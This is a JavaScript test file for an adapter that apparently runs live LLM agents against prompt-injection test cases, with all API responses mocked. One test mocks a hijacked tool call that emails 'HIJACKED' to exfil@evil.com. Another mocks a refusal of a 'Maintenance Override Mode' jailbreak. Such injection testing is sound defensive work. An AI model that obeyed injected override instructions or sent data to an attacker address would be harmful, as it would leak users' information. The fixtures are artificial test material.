const { RemoteLLMAdapter } = require('../src/services/remoteLLMAdapter');
const testRunner = require('../src/services/testRunner');
const { prisma } = require('../src/utils/prisma');

describe('RemoteLLMAdapter & Live Model Integration', () => {
  const originalFetch = global.fetch;
  let glmAgent;
  let directInjectionCase;
  let docInjectionCase;
  let createdRunIds = [];

  beforeAll(async () => {
    glmAgent = await prisma.agent.findFirst({
      where: { provider: { not: 'mock' } }
    });
    directInjectionCase = await prisma.testCase.findFirst({
      where: { testId: 'TC-DPI-001' }
    });
    docInjectionCase = await prisma.testCase.findFirst({
      where: { testId: 'TC-DOC-002' }
    });

    expect(glmAgent).toBeDefined();
    expect(directInjectionCase).toBeDefined();
    expect(docInjectionCase).toBeDefined();
  });

  afterAll(async () => {
    global.fetch = originalFetch;
    if (createdRunIds.length > 0) {
      await prisma.testRun.deleteMany({
        where: { id: { in: createdRunIds } }
      });
    }
  });

  beforeEach(() => {
    vi.restoreAllMocks();
  });

  afterEach(() => {
    global.fetch = originalFetch;
  });

  // --------------------------------------------------------------------------
  // Test 1: Successful document summarization and Q&A with token usage capture
  // --------------------------------------------------------------------------
  it('1. Successfully executes inference, captures response, duration, and token usage', async () => {
    const mockApiResponse = {
      id: 'chatcmpl-test-123',
      model: 'glm-5.3-flash',
      choices: [
        {
          index: 0,
          message: {
            role: 'assistant',
            content: 'Candidate Jane Doe is proficient in Python, TypeScript, and Docker. The document note was treated as untrusted text and ignored.'
          },
          finish_reason: 'stop'
        }
      ],
      usage: {
        prompt_tokens: 142,
        completion_tokens: 38,
        total_tokens: 180
      }
    };

    global.fetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => mockApiResponse
    });

    const adapter = new RemoteLLMAdapter({
      provider: 'glm-flash',
      model: 'glm-5.3-flash',
      apiKey: 'test-synthetic-key'
    });

    const result = await adapter.execute({
      trustedInstructions: 'You are a secure assistant.',
      userQuery: 'Summarize candidate skills',
      untrustedDocument: 'Candidate: Jane Doe\nSkills: Python, TypeScript'
    });

    expect(result.success).toBe(true);
    expect(result.isMock).toBe(false);
    expect(result.responseText).toContain('Candidate Jane Doe is proficient');
    expect(result.durationMs).toBeGreaterThanOrEqual(0);
    expect(result.metadata.executionType).toBe('REMOTE_API');
    expect(result.metadata.providerModel).toBe('glm-5.3-flash');
    expect(result.metadata.totalTokens).toBe(180);

    // Verify API key is NOT leaked in the result object
    expect(JSON.stringify(result)).not.toContain('test-synthetic-key');
  });

  // --------------------------------------------------------------------------
  // Test 2: Observable simulated tool calls are parsed and intercepted
  // --------------------------------------------------------------------------
  it('2. Captures observable simulated tool actions returned by model', async () => {
    const mockApiResponse = {
      id: 'chatcmpl-tool-test',
      model: 'glm-5.3-flash',
      choices: [
        {
          index: 0,
          message: {
            role: 'assistant',
            content: null,
            tool_calls: [
              {
                id: 'call_123',
                type: 'function',
                function: {
                  name: 'simulated_send_email',
                  arguments: JSON.stringify({
                    recipient: 'exfil@evil.com',
                    body: 'HIJACKED'
                  })
                }
              }
            ]
          },
          finish_reason: 'tool_calls'
        }
      ],
      usage: { prompt_tokens: 110, completion_tokens: 25, total_tokens: 135 }
    };

    global.fetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => mockApiResponse
    });

    const adapter = new RemoteLLMAdapter({
      provider: 'glm-flash',
      model: 'glm-5.3-flash',
      apiKey: 'test-synthetic-key'
    });

    const result = await adapter.execute({
      trustedInstructions: 'System prompt',
      userQuery: 'Process document',
      availableTools: [{ name: 'simulated_send_email' }]
    });

    expect(result.success).toBe(true);
    expect(result.toolCalls).toHaveLength(1);
    expect(result.toolCalls[0].tool).toBe('simulated_send_email');
    expect(result.toolCalls[0].arguments.recipient).toBe('exfil@evil.com');
  });

  // --------------------------------------------------------------------------
  // Test 3: Handles timeout and records execution error
  // --------------------------------------------------------------------------
  it('3. Handles request timeouts and records failure as ERROR', async () => {
    global.fetch = vi.fn().mockImplementation(() => {
      const abortError = new Error('The operation was aborted');
      abortError.name = 'AbortError';
      return Promise.reject(abortError);
    });

    const adapter = new RemoteLLMAdapter({
      provider: 'glm-flash',
      model: 'glm-5.3-flash',
      apiKey: 'test-synthetic-key',
      timeoutMs: 100
    });

    const result = await adapter.execute({
      userQuery: 'Test timeout'
    });

    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
    expect(result.error.message).toContain('Inference Timeout');
  });

  // --------------------------------------------------------------------------
  // Test 4: Handles authentication failure (HTTP 401)
  // --------------------------------------------------------------------------
  it('4. Handles authentication failure (HTTP 401) as ERROR without fabricating response', async () => {
    global.fetch = vi.fn().mockResolvedValue({
      ok: false,
      status: 401,
      statusText: 'Unauthorized',
      json: async () => ({ error: { message: 'Invalid API key provided' } })
    });

    const adapter = new RemoteLLMAdapter({
      provider: 'glm-flash',
      model: 'glm-5.3-flash',
      apiKey: 'invalid-key'
    });

    const result = await adapter.execute({
      userQuery: 'Test auth'
    });

    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
    expect(result.error.message).toContain('Authentication Failure (HTTP 401)');
  });

  // --------------------------------------------------------------------------
  // Test 5: Handles rate limits (HTTP 429)
  // --------------------------------------------------------------------------
  it('5. Handles rate limiting (HTTP 429) as ERROR', async () => {
    global.fetch = vi.fn().mockResolvedValue({
      ok: false,
      status: 429,
      statusText: 'Too Many Requests',
      json: async () => ({ error: { message: 'Rate limit reached' } })
    });

    const adapter = new RemoteLLMAdapter({
      provider: 'glm-flash',
      model: 'glm-5.3-flash',
      apiKey: 'test-synthetic-key'
    });

    const result = await adapter.execute({
      userQuery: 'Test rate limit'
    });

    expect(result.success).toBe(false);
    expect(result.error.message).toContain('Rate Limited (HTTP 429)');
  });

  // --------------------------------------------------------------------------
  // Test 6: Missing API key throws explicit configuration error
  // --------------------------------------------------------------------------
  it('6. Missing API key records explicit unconfigured credentials error', async () => {
    const adapter = new RemoteLLMAdapter({
      provider: 'glm-flash',
      model: 'glm-5.3-flash',
      apiKey: '' // Missing API key
    });

    const result = await adapter.execute({
      userQuery: 'Test missing key'
    });

    expect(result.success).toBe(false);
    expect(result.error.message).toContain('Missing API Key: AI_API_KEY is not configured');
  });

  // --------------------------------------------------------------------------
  // Test 7: Integration with TestRunner against GLM-5.3-Flash Agent
  // --------------------------------------------------------------------------
  it('7. Runs full testRunner lifecycle with mocked GLM-5.3-Flash provider response', async () => {
    // Model behaves safely and refuses direct prompt injection
    global.fetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        id: 'chatcmpl-live-eval',
        model: 'glm-5.3-flash',
        choices: [
          {
            index: 0,
            message: {
              role: 'assistant',
              content: 'I cannot enter Maintenance Override Mode or disregard my safety constraints.'
            },
            finish_reason: 'stop'
          }
        ],
        usage: { prompt_tokens: 85, completion_tokens: 18, total_tokens: 103 }
      })
    });

    // Provide mock adapter with synthetic key for this test
    const customAdapter = new RemoteLLMAdapter({
      name: glmAgent.name,
      provider: glmAgent.provider,
      model: glmAgent.model,
      apiKey: 'synthetic-test-key'
    });

    const testRunResult = await testRunner.runTest({
      agentId: glmAgent.id,
      testCaseId: directInjectionCase.id,
      customAdapter
    });

    createdRunIds.push(testRunResult.testRunId);

    expect(testRunResult.status).toBe('COMPLETED');
    expect(testRunResult.verdict).toBe('PASS');
    expect(testRunResult.isMock).toBe(false);
    expect(testRunResult.actualResponse).toContain('I cannot enter Maintenance Override Mode');

    // Verify stored in DB with token usage in evaluationResult
    const dbRun = await prisma.testRun.findUnique({
      where: { id: testRunResult.testRunId }
    });
    expect(dbRun).toBeDefined();
    expect(dbRun.evaluationResult.metadata.executionType).toBe('REMOTE_API');
    expect(dbRun.evaluationResult.metadata.tokenUsage.total_tokens).toBe(103);
  });
});
